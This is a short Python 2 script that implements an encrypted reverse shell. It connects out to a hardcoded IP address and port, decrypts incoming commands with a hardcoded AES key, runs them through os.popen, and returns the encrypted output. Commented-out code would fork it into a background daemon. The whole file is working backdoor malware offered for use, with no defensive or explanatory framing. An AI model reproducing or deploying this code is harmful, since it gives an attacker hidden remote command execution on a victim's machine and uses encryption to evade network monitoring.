#!/usr/bin/python

import os,sys,socket,subprocess,base64
from Crypto.Cipher import AES

BUFFER = 4096
BLOCK = 32
PADDING = '!'
SECRET = "vu6TZprmfje5A~F5]T_$Ls-?#!:@5sXH"
#HOST = '130.211.102.76'
HOST = '10.200.158.29'
PORT = 55557


addPadding = lambda s: s + (BLOCK - len(s) % BLOCK) * PADDING
encodeAES = lambda c, s: base64.b64encode(c.encrypt(addPadding(s)))
decodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)


def knockOnTheDoor():
	cipher = AES.new(SECRET)

	s = socket.socket()
	s.connect((HOST, PORT))

	while True:
		cmd = s.recv(BUFFER)

		cmd = base64.b64decode(cmd)
		cmd = decodeAES(cipher, cmd)

		if cmd == 'quitme': 
			break

		pipe = os.popen(cmd)
		raw_out = pipe.readlines()	 

		print(raw_out)
		data = ''
		for i in raw_out:
			data += i

		data = encodeAES(cipher, data)
		data = base64.b64encode(data)
	
		s.send("\n" + data + "\r\n")
	
	s.close

# Main
if __name__ == "__main__":

	'''
	try:
		pid = os.fork()
		if pid > 0:
			sys.exit(0)
	except OSError, e:
		print >> sys.stderr, "fork fialed: %d (%s)" % (e.errno), e.strerror)
		sys.exit(1)
	'''
	# Requires root access
	#os.chdir("/")
	#os.setsid()
	#os.umask(0)

	knockOnTheDoor()
